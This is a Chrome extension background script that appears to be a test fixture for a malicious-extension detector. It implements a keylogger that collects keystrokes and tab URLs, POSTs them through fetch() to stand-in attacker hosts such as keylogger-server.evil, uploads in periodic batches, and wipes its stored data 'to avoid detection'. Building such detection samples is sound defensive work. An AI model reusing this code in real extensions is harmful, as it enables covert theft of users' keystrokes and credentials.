// TEST EXTENSION: Background script for keylogging test

console.log('TEST: Keylogging extension background loaded');

// Storage for collected keystrokes (for testing purposes)
let keystrokeData = [];

// Pattern 1: Message listener for keystrokes from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'keystroke') {
    console.log('TEST: Keystroke received:', message.data);
    
    // Store keystroke data
    keystrokeData.push({
      ...message.data,
      timestamp: Date.now(),
      tabId: sender.tab?.id,
      url: sender.tab?.url
    });
    
    // Simulate sending to external endpoint
    simulateDataTransmission(message.data);
    
    sendResponse({ status: 'recorded' });
  }
  
  if (message.type === 'getKeystrokeData') {
    sendResponse({ data: keystrokeData });
  }
});

// Pattern 2: Simulate data transmission to external server
function simulateDataTransmission(keystrokeData) {
  const suspiciousEndpoints = [
    'https://keylogger-server.evil/collect',
    'https://data-stealer.malicious/keys',
    'https://remote-logger.bad/api/store'
  ];
  
  const endpoint = suspiciousEndpoints[Math.floor(Math.random() * suspiciousEndpoints.length)];
  
  console.log('TEST: Simulating keystroke transmission to:', endpoint);
  
  // Simulate fetch request (will fail but pattern should be detected)
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Logger-ID': chrome.runtime.id
    },
    body: JSON.stringify({
      keystrokes: keystrokeData,
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    })
  }).catch(err => {
    console.log('TEST: Transmission failed (expected):', err.message);
  });
}

// Pattern 3: Periodic data upload
function startPeriodicUpload() {
  setInterval(() => {
    if (keystrokeData.length > 0) {
      console.log('TEST: Periodic upload of', keystrokeData.length, 'keystrokes');
      
      // Simulate bulk upload
      const bulkData = {
        session: Date.now(),
        keystrokes: keystrokeData.splice(0, 100), // Upload in batches
        extensionId: chrome.runtime.id
      };
      
      simulateDataTransmission(bulkData);
    }
  }, 60000); // Every minute
}

// Pattern 4: Clear evidence periodically
function clearEvidencePeriodically() {
  setInterval(() => {
    // Clear stored keystroke data to avoid detection
    keystrokeData = [];
    console.log('TEST: Cleared keystroke evidence');
  }, 5 * 60000); // Every 5 minutes
}

chrome.runtime.onInstalled.addListener(() => {
  console.log('TEST: Keylogging extension installed');
  startPeriodicUpload();
  clearEvidencePeriodically();
});